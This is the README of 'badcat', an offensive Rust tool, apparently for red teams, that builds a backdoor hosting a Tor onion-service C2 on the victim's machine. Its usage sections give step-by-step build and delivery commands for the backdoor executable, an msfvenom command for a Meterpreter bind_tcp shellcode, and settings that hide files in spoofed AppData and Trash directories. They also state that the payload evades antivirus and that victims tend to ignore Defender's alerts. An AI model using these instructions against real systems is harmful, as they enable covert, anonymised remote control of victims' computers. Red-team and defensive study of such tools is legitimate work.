# badcat

This a tool intended to be used by Red Teams, in order to mimic APT ([Advanced Persistent Threat](https://csrc.nist.gov/glossary/term/advanced_persistent_threat)) attacks. It hides the C2 ([Command and Control](https://csrc.nist.gov/glossary/term/C2)) server by using [Onion Services](https://community.torproject.org/onion-services/overview/) to masquerade attacker's real IP address.

The initial Proof of Concept is in the branch [initial-poc](https://github.com/yanmarques/badcat/tree/initial-poc). One will find there the first attempt to implement such idea. The initial PoC exists for historical reasons, and should only be used for testing.

# Glossary
_attacker_: conductor of the attack.

_victim_: the target machine of the attack.

_backdoor_: executable generated by the _attacker_ and delivered to _victim_.

_server_: _backdoor_ running Tor Onion Service on the _victim_.

# Features

1. Embeded Tor executable inside the _backdoor_. No need to create a new process for the Tor binary.
2. Automatic Hidden Service configuration using a configurable torrc template.
3. Authentication to access the _server_.
4. Optional use of payload (aka shellcode) in the _backdoor_, which is only executed once the attacker connects evading any AV real time monitoring. When not using a payload, fallback to badcat's basic shell.
5. Execution of payload can be re-started many times from the attacker.
5. XOR encryption of every sensible thing.
6. Full [rust](https://www.rust-lang.org/) source code.

# Alternatives

So far I have only found [ToRat](https://github.com/lu4p/ToRat) as a good alternative.

## ToRat

ToRat is a Remote Administration tool using Tor as a transport mechanism and RPC for communication. There are conceptual differences between badcat and ToRat. The former focuses at creating an environment for shipping an anonymous backdoor with user adaptable payload. On the other hand, ToRat tries to be an All-In-One solution, featuring among other things, util commands via RPC, cross-platform and multi-user persistence, code obfuscation.

The big advantage of badcat compared to ToRat is the way it uses the Onion Service. Differently than ToRat, the server starts in the client and the attacker connects to the server, using the bind tcp approach. In the situation you are behind a Tor proxy and can't change Tor's configuration, this approach can be benefitial.

Also badcat support arbitrary payload execution in order to allow quick generation of full-featured backdoors shipping a Meterpreter shellcode, for example.

# Getting Started

## Install Rust

Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
Select the default installation. Rustup prepares your environment for cross-compilation and dependency management using `cargo`.

```bash
...

    stable-x86_64-unknown-linux-gnu installed - rustc 1.56.1 (59eed8a2a 2021-11-01)


Rust is installed now. Great!

To get started you may need to restart your current shell.
This would reload your PATH environment variable to include
Cargo's bin directory ($HOME/.cargo/bin).

To configure your current shell, run:
source $HOME/.cargo/env
```

Now restart your shell or execute the mentioned command above to configure your shell.
With the configured shell, run the following command to ensure `rustup` was installed with success:

```bash
$ rustup --version
rustup 1.24.3 (ce5817a94 2021-05-31)
info: This is the version for the rustup toolchain manager, not the rustc compiler.
info: The currently active `rustc` version is `rustc 1.56.1 (59eed8a2a 2021-11-01)`
```

## Simple Quick Usage

This quick example shows how to generate the _backdoor_ for a Windows x64 machine using Fedora (Linux). Let's breakdown the steps to gain remote command execution into 4 steps.

### 1. Compile the attacker toolkit once

The attacker toolkit is used to access _victim_'s computer through the backdoor, you are able to use it anywhere as long as you have the hosts file. The hosts file describes each of your _victim_ and how to get in touch with them.

```bash
$ cargo build --release -p attacker
```

The executable is at `target/release/attacker`.

### 2. Install Windows cross-compilation toolchain

We need to configure `rust` to target the Windows host.

```bash
$ rustup target add x86_64-pc-windows-gnu
$ rustup toolchain install stable-x86_64-pc-windows-gnu
error: DEPRECATED: future versions of rustup will require --force-non-host to install a non-host toolchain as the default.
warning: toolchain 'stable-x86_64-pc-windows-gnu' may not be able to run on this system.
warning: If you meant to build software to target that platform, perhaps try `rustup target add x86_64-pc-windows-gnu` instead?
info: syncing channel updates for 'stable-x86_64-pc-windows-gnu'
info: latest update on 2021-11-01, rust version 1.56.1 (59eed8a2a 2021-11-01)
info: downloading component 'cargo'
info: downloading component 'clippy'
info: downloading component 'rust-docs'
info: downloading component 'rust-mingw'
info: downloading component 'rust-std'
info: downloading component 'rustc'
info: downloading component 'rustfmt'
info: installing component 'cargo'
info: installing component 'clippy'
info: installing component 'rust-docs'
 17.2 MiB /  17.2 MiB (100 %)   1.7 MiB/s in  8s ETA:  0s
info: installing component 'rust-mingw'
info: installing component 'rust-std'
 31.4 MiB /  31.4 MiB (100 %)   9.7 MiB/s in  3s ETA:  0s
info: installing component 'rustc'
135.2 MiB / 135.2 MiB (100 %)   8.1 MiB/s in 16s ETA:  0s
info: installing component 'rustfmt'
  6.2 MiB /   6.2 MiB (100 %)   6.2 MiB/s in  1s ETA:  0s

  stable-x86_64-pc-windows-gnu installed - (rustc does not exist)

info: checking for self-updates
```

The two commands above may take a few minutes to complete.

There are two last components to install, the [Mingw](https://www.mingw-w64.org/) GCC compiler and `pthread` static libraries. Lookup how to install `Mingw` and `pthread` for your Operating System, remember that we are targeting `win64`. Hint, on Fedora the package name is `mingw64-gcc` and `mingw64-winpthreads-static`, respectively.

Then ensure it's fully configured running:

```bash
$ x86_64-w64-mingw32-gcc --version
x86_64-w64-mingw32-gcc (GCC) 10.3.1 20210422 (Fedora MinGW 10.3.1-2.fc33)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

The version shown may be different than yours.

### 3. Build the _backdoor_ for Windows

Finally we are able to compile the _backdoor_. Every time you build a _backdoor_, badcat reads a configuration file with instructions. This configuration file must be at `victim/settings.json` but it's intended to be per-installation, so there is an example file at `victim/settings.json.example`. 

Once you have created the configuration from the example, we are done to build the _backdoor_ using the default configurations, which are the following:

- name of target host as `a host that knows you are hacking them`. This name is used to identificate which machine to connect, so change them accordingly to keep yourself organized.
- payload disabled, so badcat's basic shell will be used.

Build the _backdoor_ targeting Windows x64:

```bash
$ cargo build -p victim --release --target=x86_64-pc-windows-gnu
```

Once completed, check the result file:

```bash
$ file target/x86_64-pc-windows-gnu/release/victim.exe
target/x86_64-pc-windows-gnu/release/victim.exe: PE32+ executable (GUI) x86-64, for MS Windows
```

That seems fine. You may now had noticed that a new file called `hosts.json` was created. That is the configuration file used to connect to the _victim_ using the attacker toolkit. It contains a list of host objects, so whenever you build a new _backdoor_ the `hosts.json` is updated with the new host information.

### 4. Delivery and Control

Deliver the generated executable to the _victim_ and execute it. The figure 1 shows the size of the _backdoor_ and the date which Microsoft Windows Defender does not catch it.

Figure 1 - Windows screenshot of running _backdoor_
![Windows screenshot of running _backdoor_](https://user-images.githubusercontent.com/28604565/144435072-3c5d9eac-7abf-4c57-905a-e2b2d75c1b1f.png)

Now configure Tor at your attacker machine and connect to the victim through the attacker toolkit. The attacker toolkit already uses the default Tor socks address. The figure 2 presents the toolkit interface and the PowerShell opened for commands. 

Figure 2 - Attacker toolkit connected to _backdoor_
![Attacker toolkit connected to _backdoor_](https://user-images.githubusercontent.com/28604565/144435172-272add11-93ef-4515-8154-4b3ca73422c0.png)

## Advanced Usage

You'll find in this topic advanced ways to accomplish better results compared to the [simple quick usage](#simple-quick-usage) example.

### Executing Custom Payload

One of the advanced features of badcat is the ability to execute custom payload. Let me elaborate: one can inject a payload into executable memory and jump into it, just after the _attacker_ connected to the _server_. So what kind of usefull payloads one might inject? Bind tcp ones. Badcat actually prepares a port on the _server_ for you to use a bind tcp payload, you can set the payload to anything wanted though.

Examples:

### 1. Connect through a custom shell

Generate your payload and write the raw bytes to a file. Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `4444` for the purpose of this example:

```json
{
    "name": "my custom shell",
    "hosts_file": "../hosts.json",
    "tor": {
        "spoof_dir": {
            "windows": "AppData\\Local\\Microsoft",
            "linux": ".local/share/Trash/.repo"
        },
        "rc_file": "torrc",
    },
    "payload": {
        "enabled": true,
        "file": "MY-AWESOME-PAYLOAD.bin",
        "bind_port": "4444"
    }
}
```

**Note: Before compiling your _backdoor_ and deliver as usual, ensure the build target is the right one for your payload. I mean, if you are using a Linux payload you could target Windows, but the payload would never execute properly.**

When connecting, the attacker toolkit will execute the payload for you, but according to figure 3, nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` - 4444 in our example.

Figure 3 - Attacker toolkit message about the payload
![Attacker toolkit message about the payload](https://user-images.githubusercontent.com/28604565/144483939-e72bc74c-5e0f-481c-b14c-b639bde7de2a.png)

### 2. Connect through a meterpreter session

Using Meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade - as far as I can tell - almost all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.

The steps to use a Meterpreter shellcode is exactly the same as in example 1.

Generate the shellcode as raw bytes with `msfvenom`:

```bash
$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f raw -o payload.bin
```

Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `6666` for the purpose of this example:

```json
{
    "name": "my meterpreter",
    "hosts_file": "../hosts.json",
    "tor": {
        "spoof_dir": {
            "windows": "AppData\\Local\\Microsoft",
            "linux": ".local/share/Trash/.repo"
        },
        "rc_file": "torrc",
    },
    "payload": {
        "enabled": true,
        "file": "../payload.bin",
        "bind_port": "6666"
    }
}
```

Now compile your _backdoor_ and deliver as usual.

In the moment the _attacker_ connects and payload is going be executed on the _victim_, one may see the common Microsoft Windows Defender - useless - Alert, ilustrated on figure 4. This alert is extremelly generic, and users tend to ignore such alerts because it does not say it's a malware. But thats kind of funny that the payload was already executed and the port is listening in the background. And even if one does not `Allow access`, the payload keeps running and Windows does nothing about it.

Figure 4 - Microsoft Windows Defender Alert
![Microsoft Windows Defender useless Alert](https://user-images.githubusercontent.com/28604565/144487035-746a3e80-155e-42d5-b75b-cbe8f7fcb054.png)


After `Canceling` or `Allowing access` through Microsoft Windows Defender Alert, you are able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 6666 in our example, as ilustrated on figure 5.

Fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_. After opened configure a handler for your payload and exploit it.

Figure 5 - Meterpreter session opened through badcat
![Meterpreter session opened through badcat](https://user-images.githubusercontent.com/28604565/144487158-6ef721e7-2d2b-498c-a6c0-038434872182.png)


